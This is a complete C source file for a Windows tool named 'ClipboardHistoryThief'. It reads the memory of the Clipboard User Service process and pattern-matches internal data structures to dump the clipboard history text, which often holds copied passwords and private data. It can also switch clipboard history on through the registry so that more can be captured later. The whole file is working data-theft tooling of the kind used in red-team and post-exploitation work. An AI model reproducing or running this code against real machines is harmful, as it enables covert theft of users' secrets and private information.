#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <winternl.h>
#include <ntstatus.h>

// Signature data
BYTE endByte = 0x1;
wchar_t textTypeValue[] = L"Text";
size_t textTypeLen = sizeof(textTypeValue);

BOOL getUserFromProcess(HANDLE hProcess, LPTSTR* ppUser) {
    HANDLE hToken = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwTokenUserSize = 0;
    BOOL bSuccess = FALSE;

    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    // Get the required buffer size
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwTokenUserSize);

    pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwTokenUserSize);
    if (!pTokenUser) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenUserSize, &dwTokenUserSize)) {
        TCHAR szName[MAX_PATH];
        TCHAR szDomain[MAX_PATH];
        DWORD dwNameSize = sizeof(szName) / sizeof(TCHAR);
        DWORD dwDomainSize = sizeof(szDomain) / sizeof(TCHAR);
        SID_NAME_USE eSidType;

        if (LookupAccountSid(NULL, pTokenUser->User.Sid, szName, &dwNameSize, szDomain, &dwDomainSize, &eSidType)) {
            *ppUser = (LPTSTR)malloc((dwNameSize + dwDomainSize + 2) * sizeof(TCHAR));
            if (*ppUser) {
                _stprintf(*ppUser, _T("%s\\%s"), szDomain, szName);
                bSuccess = TRUE;
            }
        }
    }

    LocalFree(pTokenUser);
    CloseHandle(hToken);

    return bSuccess;
}

BOOL serviceNameStartsWith(LPCTSTR serviceName, LPCTSTR prefix) {
    return _tcsncmp(serviceName, prefix, _tcslen(prefix)) == 0;
}

DWORD getClipboardSvcProcessID() {
    DWORD clipboardSvcPID = 0;
    SC_HANDLE hSCManager = NULL;
    ENUM_SERVICE_STATUS_PROCESS* pServices = NULL;
    DWORD dwBytesNeeded = 0;
    DWORD dwServicesReturned = 0;
    DWORD dwResumeHandle = 0;

    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL) {
        printf("OpenSCManager failed with error %d\n", GetLastError());
        return 0;
    }

    // Get total size of all service information
    if (!EnumServicesStatusEx(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL) &&
        GetLastError() != ERROR_MORE_DATA) {
        printf("EnumServicesStatusEx failed with error %d\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return 0;
    }

    // Get all service information
    pServices = (ENUM_SERVICE_STATUS_PROCESS*)malloc(dwBytesNeeded);
    if (!EnumServicesStatusEx(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)pServices, dwBytesNeeded, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL)) {
        printf("EnumServicesStatusEx failed with error %d\n", GetLastError());
        free(pServices);
        CloseServiceHandle(hSCManager);
        return 0;
    }

    // Look for service name starts with "cbdsvc" which is Clipboard User Service
    for (DWORD i = 0; i < dwServicesReturned; i++) {
        if (serviceNameStartsWith(pServices[i].lpServiceName, _T("cbdhsvc"))) {
            clipboardSvcPID = pServices[i].ServiceStatusProcess.dwProcessId;
            break;
        }
    }

    free(pServices);
    CloseServiceHandle(hSCManager);

    return clipboardSvcPID;
}

BOOL getProcessCommandLine(HANDLE hProcess, TCHAR *szCommandLine, DWORD nSize) {
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ulReturnLength;

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ulReturnLength);

    if (status == STATUS_SUCCESS) {
        PEB peb;
        SIZE_T bytesRead;
        // Read the PEB
        if (ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead)) {
            RTL_USER_PROCESS_PARAMETERS upp;
            // Read process parameter information
            if (ReadProcessMemory(hProcess, peb.ProcessParameters, &upp, sizeof(upp), &bytesRead)) {
                WCHAR wszCommandLine[MAX_PATH];
                if (ReadProcessMemory(hProcess, upp.CommandLine.Buffer, wszCommandLine, nSize, &bytesRead)) {
                    wszCommandLine[bytesRead / sizeof(WCHAR)] = L'\0';
                    WideCharToMultiByte(CP_ACP, 0, wszCommandLine, -1, szCommandLine, nSize, NULL, NULL);
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

char* wideToUtf8(const WCHAR* wideStr) {
    int utf8Size = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
    char* utf8Str = (char*)malloc(utf8Size);
    WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Size, NULL, NULL);
    return utf8Str;
}

BOOL isWithinRdataSection(HANDLE hProcess, HMODULE hModule, DWORD_PTR address) {
    BOOL result = FALSE;
    IMAGE_DOS_HEADER dosHeader = {0};
    IMAGE_NT_HEADERS ntHeaders = {0};
    SIZE_T bytesRead;

    // Read the DOS header
    if (!ReadProcessMemory(hProcess, hModule, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead))
        return result;

    // Read the NT headers
    if (!ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hModule + dosHeader.e_lfanew), &ntHeaders, sizeof(IMAGE_NT_HEADERS), &bytesRead))
        return result;

    // Read the number of sections
    WORD numSections = ntHeaders.FileHeader.NumberOfSections;

    // Allocate memory for the section headers
    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)malloc(numSections * sizeof(IMAGE_SECTION_HEADER));

    // Read the section headers
    if (!ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hModule + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS)), sectionHeaders, numSections * sizeof(IMAGE_SECTION_HEADER), &bytesRead)) {
        free(sectionHeaders);
        return result;
    }

    // Iterate through the section headers and look for the ".rdata" section
    for (WORD i = 0; i < numSections; i++) {
        if (strncmp((const char *)sectionHeaders[i].Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
            DWORD_PTR sectionStart = (DWORD_PTR)hModule + sectionHeaders[i].VirtualAddress;
            DWORD_PTR sectionEnd = sectionStart + sectionHeaders[i].Misc.VirtualSize;

            // Check if the given address is within the ".rdata" section
            if (address >= sectionStart && address < sectionEnd)
                result = TRUE;
            break;
        }
    }

    // Free the allocated memory
    free(sectionHeaders);

    return result;
}

void clipboardHistoryDump(const char* outputPath) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    HMODULE hMod;
    FILE* outputFile = NULL;
    if (outputPath != NULL) {
        outputFile = fopen(outputPath, "w");
        if (outputFile == NULL) {
            printf("Failed to create file. Please check if the file path is valid.\n");
            return;
        }
    }

    DWORD clipboardSvcPID = getClipboardSvcProcessID();
    if (clipboardSvcPID == 0) {
        goto exit;
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, clipboardSvcPID);
    if (hProcess != NULL) {
        LPTSTR pUser = NULL;
        if (getUserFromProcess(hProcess, &pUser)) {
            if (outputFile == NULL)
                _tprintf(_T("User running the cbdhsvc service process: %s\n"), pUser);
            else
                fprintf(outputFile, "User running the cbdhsvc servoce process: %s\n", pUser);
            free(pUser);
        } else
            _tprintf(_T("Failed to get the username.\n"));
        
        MEMORY_BASIC_INFORMATION memInfo;
        HMODULE hWindowsDataTransferDll = NULL;
        DWORD cbNeededModules;
        if (EnumProcessModules(hProcess, NULL, 0, &cbNeededModules)) {
            HMODULE *hMods = (HMODULE *)malloc(cbNeededModules);
            if (EnumProcessModules(hProcess, hMods, cbNeededModules, &cbNeededModules)) {
                for (unsigned int k = 0; k < cbNeededModules / sizeof(HMODULE); k++) {
                    TCHAR szModuleName[MAX_PATH];
                    if (GetModuleBaseName(hProcess, hMods[k], szModuleName, sizeof(szModuleName) / sizeof(TCHAR))) {
                        if (_tcscmp(szModuleName, _T("windows.applicationmodel.datatransfer.dll")) == 0) {
                            hWindowsDataTransferDll = hMods[k];
                            break;
                        }
                    }
                }
            }
            free(hMods);
        }

        // Iterate through the process memory to find the specified pattern
        for (LPVOID addr = 0; VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo)) == sizeof(memInfo); addr = (LPVOID)((DWORD_PTR)addr + memInfo.RegionSize)) {
            // Check if the memory region meets the criteria
            if (memInfo.State == MEM_COMMIT && memInfo.Type == MEM_PRIVATE && memInfo.Protect == PAGE_READWRITE) {
                BYTE *buffer = (BYTE *)malloc(memInfo.RegionSize);
                SIZE_T bytesRead;
                if (ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, memInfo.RegionSize, &bytesRead)) {
                    for (SIZE_T j = 0; j < bytesRead - sizeof(BYTE); j++) {
                        DWORD_PTR rdataAddress;
                        DWORD_PTR textTypeAddress;
                        wchar_t textType[5];

                        // Pattern search for clipboard text
                        // Locate 0x1 endByte (can be removed. It can make the search faster to avoid ReadProcessMemory every address)
                        // Locate .rdata address of "windows.applicationmodel.datatransfer.dll" which is vftable data structure
                        // Locate the lpszformat "Text" type
                        // 00000185`a7b37d80  00007fff`1493f120 00000185`a6f27460 <- [CUnicodeTextFormat::`vftable' address] [Address storing text type]
                        // 00000185`a7b37d90  00000000`00000000 00000185`a7b3ac40 <- [] [Address that stores the clipboard data]
                        // 00000185`a7b37da0  00000000`00000001 00000000`00000000 <- [Unknown end byte] []
                        if (
                            memcmp(buffer + j + 0x20, &endByte, sizeof(BYTE)) == 0 &&
                            ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)memInfo.BaseAddress + j), &rdataAddress, sizeof(DWORD_PTR), NULL) &&
                            isWithinRdataSection(hProcess, hWindowsDataTransferDll, rdataAddress) &&
                            ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)memInfo.BaseAddress + j + 8), &textTypeAddress, sizeof(DWORD_PTR), NULL) &&
                            ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)textTypeAddress + 0x1c), &textType, textTypeLen, NULL) &&
                            wcscmp(textType, textTypeValue) == 0) {
                            // Address that stores the clipboard data
                            LPVOID clipboardDataPtrAddress = (LPVOID)((DWORD_PTR)memInfo.BaseAddress + j + 0x18);
                            DWORD_PTR clipboardDataAddress;
                            if (ReadProcessMemory(hProcess, clipboardDataPtrAddress, &clipboardDataAddress, sizeof(clipboardDataAddress), NULL)) {
                                WCHAR* clipboardData = NULL;
                                SIZE_T dataSize = 256; // Set the initial buffer size
                                SIZE_T bytesRead1;
                                SIZE_T totalBytesRead = 0;
                                BOOL readCompleted = FALSE;

                                clipboardData = (WCHAR*)malloc(dataSize * sizeof(WCHAR));

                                // Read the Unicode string byte by byte until reaching the termination bytes
                                while (!readCompleted && totalBytesRead < dataSize * sizeof(WCHAR) - sizeof(WCHAR)) {
                                    if (ReadProcessMemory(hProcess, (LPCVOID)(clipboardDataAddress + totalBytesRead), &clipboardData[totalBytesRead / sizeof(WCHAR)], sizeof(WCHAR), &bytesRead1)) {
                                        if (bytesRead1 == sizeof(WCHAR) && clipboardData[totalBytesRead / sizeof(WCHAR)] == L'\0')
                                            readCompleted = TRUE;
                                        else
                                            totalBytesRead += bytesRead1;
                                    } else
                                        break;

                                    if (totalBytesRead == dataSize * sizeof(WCHAR) - sizeof(WCHAR)) {
                                        // Resize the buffer if needed
                                        dataSize *= 2;
                                        clipboardData = (WCHAR*)realloc(clipboardData, dataSize * sizeof(WCHAR));
                                    }
                                }

                                if (totalBytesRead > 0) {
                                    clipboardData[totalBytesRead / sizeof(WCHAR)] = L'\0';
                                    char* utf8Str = wideToUtf8(clipboardData);
                                    if (outputFile == NULL) {
                                        printf("======================= Clipboard Content ========================\n");
                                        //printf("Address:0x%p\n", clipboardDataAddress);
                                        printf("%s\n", utf8Str);
                                        printf("==================================================================\n\n");
                                    } else {
                                        fprintf(outputFile, "======================= Clipboard Content ========================\n");
                                        fprintf(outputFile, "%s\n", utf8Str);
                                        fprintf(outputFile, "==================================================================\n\n");
                                    }
                                    free(utf8Str);
                                }
                            }
                        }
                    }
                }
                free(buffer);
            }
        }
    }
    CloseHandle(hProcess);

    if (outputFile != NULL)
        printf("File saved to %s.\n", outputPath);

    exit:
        fclose(outputFile);
}

void enableClipboardHistory(BOOL enable) {
    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\Clipboard";
    DWORD value = enable ? 1 : 0;

    // Open the registry key
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        fprintf(stderr, "Failed to open registry key.\n");
        return;
    }

    // Set the value of the "EnableClipboardHistory" key
    if (RegSetValueEx(hKey, "EnableClipboardHistory", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
        fprintf(stderr, "Failed to set registry value.\n");
        RegCloseKey(hKey);
        return;
    }

    // Close the registry key
    RegCloseKey(hKey);

    if (enable)
        printf("Clipboard history enabled.\n");
    else
        printf("Clipboard history disabled.\n");
    
    return;
}

BOOL isClipboardHistoryEnabled() {
    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\Clipboard";
    DWORD value = 0;
    DWORD valueType;
    DWORD valueSize = sizeof(value);

    // Open the registry key
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        fprintf(stderr, "Failed to open registry key.\n");
        return FALSE;
    }

    // Get the value of the "EnableClipboardHistory" key
    if (RegQueryValueEx(hKey, "EnableClipboardHistory", 0, &valueType, (BYTE*)&value, &valueSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }

    // Close the registry key
    RegCloseKey(hKey);

    return value == 1;
}

void showHelpMenu() {
    printf("ClipboardHistoryThief.exe [command]\n");
    printf("Author: Chris Au (netero1010)\n\n");
    printf("Commands:\n");
    printf("  dump [file]   Dumps the content of the clipboard history to console/file.\n");
    printf("  enable        Enables the clipboard history feature.\n");
    printf("  disable       Disables the clipboard history feature.\n");
    printf("  check         Checks if clipboard history feature is enabled.\n");
    printf("  help          Shows this help menu.\n");
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        if (!stricmp("dump", argv[1])) {
            if (!isClipboardHistoryEnabled())
                printf("Clipboard history is not enabled.\n");
            else {
                if (argc > 2)
                    clipboardHistoryDump(argv[2]);
                else
                    clipboardHistoryDump(NULL); // If no output file path is provided, write to the console
            }
        }
        else if (!stricmp("enable", argv[1]))
            enableClipboardHistory(TRUE);
        else if (!stricmp("disable", argv[1]))
            enableClipboardHistory(FALSE);
        else if (!stricmp("check", argv[1]))
            if(isClipboardHistoryEnabled())
                printf("Clipboard history is enabled.\n");
            else
                printf("Clipboard history is not enabled.\n");
        else if (!stricmp("-h", argv[1]) || !stricmp("help", argv[1]))
            showHelpMenu();
    } else
        showHelpMenu();

    return 0;
}